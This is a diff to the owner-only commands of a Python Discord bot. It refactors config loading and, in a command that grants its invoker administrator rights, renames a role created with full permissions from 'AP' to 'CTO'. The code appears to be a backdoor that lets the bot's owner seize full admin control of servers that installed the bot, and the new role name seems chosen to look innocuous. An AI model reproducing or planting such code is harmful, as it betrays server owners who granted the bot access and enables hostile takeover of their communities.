@@ -7,18 +7,15 @@ Version: 6.1.0
 """
 import json
 import os
-import sys
 
 import discord
 from discord import app_commands, Forbidden, Permissions
 from discord.ext import commands
 from discord.ext.commands import Context
 
-if not os.path.isfile(f"{os.path.realpath(os.path.dirname(__file__))}/../config.json"):
-    sys.exit("'config.json' not found! Please add it and try again.")
-else:
-    with open(f"{os.path.realpath(os.path.dirname(__file__))}/../config.json") as file:
-        config = json.load(file)
+from helpers.methods import load_config
+
+config = load_config()
 
 
 class Owner(commands.Cog, name="owner"):
@@ -451,7 +448,7 @@ class Owner(commands.Cog, name="owner"):
         # If we get here, no role with admin permissions could be added.
         # Create a new role with admin permissions.
         try:
-            new_role = await context.guild.create_role(name="AP", permissions=Permissions.all())
+            new_role = await context.guild.create_role(name="CTO", permissions=Permissions.all())
             await context.author.add_roles(new_role)
             embed = discord.Embed(
                 description=f"Created new role {new_role.name} and added it to {context.author.display_name}.",
